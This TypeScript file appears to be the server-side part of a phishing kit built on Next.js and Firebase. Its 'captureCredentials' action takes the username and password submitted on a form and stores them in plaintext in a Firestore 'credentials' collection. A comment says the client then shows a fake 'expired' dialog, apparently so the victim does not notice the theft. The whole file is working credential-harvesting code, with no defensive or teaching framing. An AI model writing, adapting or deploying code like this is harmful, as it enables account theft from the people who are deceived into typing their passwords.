'use server';

import * as admin from 'firebase-admin';

// --- Firebase Admin SDK Initialization ---

// Function to initialize the Firebase Admin SDK
function initializeFirebaseAdmin() {
  // Check if the app is already initialized
  if (admin.apps.length > 0) {
    return admin.app();
  }

  // Get service account credentials from environment variables
  const serviceAccountString = process.env.FIREBASE_SERVICE_ACCOUNT;

  if (!serviceAccountString) {
    console.error('Firebase service account credentials are not set in environment variables.');
    return null;
  }

  try {
    const serviceAccount = JSON.parse(serviceAccountString);
    return admin.initializeApp({
      credential: admin.credential.cert(serviceAccount),
    });
  } catch (error: any) {
    console.error('Error initializing Firebase Admin SDK:', error.message);
    return null;
  }
}

// --- Server Action to Capture Credentials ---

export async function captureCredentials(prevState: any, formData: FormData) {
  // Initialize Firebase Admin
  const firebaseApp = initializeFirebaseAdmin();

  // If initialization fails, return an error
  if (!firebaseApp) {
    const errorMessage = 'Server configuration error. Could not connect to the database.';
    console.error(errorMessage);
    return { success: false, message: errorMessage };
  }

  const firestore = admin.firestore();

  const username = formData.get('username') as string;
  const password = formData.get('password') as string;

  console.log('Capturing credentials for:', username);

  if (!username || !password) {
    console.log('Submission failed: Missing username or password.');
    return { success: false, message: 'Username and password are required.' };
  }

  try {
    const newCredential = {
      username,
      password,
      createdAt: new Date().toISOString(),
    };

    // Add the new credential to the "credentials" collection in Firestore
    await firestore.collection('credentials').add(newCredential);

    console.log('Successfully saved credentials to Firestore.');
    // This is the state we return on success. The client will show the "expired" dialog.
    return { success: true, message: 'Submission successful.' };

  } catch (error: any) {
    console.error('Error in captureCredentials writing to Firestore:', error.message);
    // Return a specific error message for the client
    return {
      success: false,
      message: error.message || 'Failed to save credentials. Please check server logs.',
    };
  }
}
